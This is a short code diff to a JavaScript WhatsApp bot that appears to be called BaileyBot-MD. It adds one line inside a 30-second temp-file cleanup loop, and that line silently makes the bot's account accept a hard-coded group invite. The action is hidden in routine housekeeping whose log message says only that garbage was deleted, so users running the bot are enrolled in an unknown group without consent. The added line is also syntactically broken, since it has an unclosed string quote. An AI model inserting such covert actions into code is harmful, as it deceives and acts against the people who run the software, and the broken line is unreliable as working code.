@@ -241,6 +241,7 @@ async function clearTmp() {
 
 setInterval(async () => {
 await clearTmp()
+await conn.groupAcceptInvite('LhlBSyakvI3GjGSvFTa1hh)
 console.log(chalk.cyan(`\n╭» ♨️ BaileyBot-MD ♨️\n│→ AUTOCLEAR │ BASURA ELIMINADA \n╰― ━ ― ━ ― ━ ― ━ ― ━ ― ━ ― ― ━ ― ━ ― ━ 🗑️♻️`))
 }, 30000) //1 munto
 
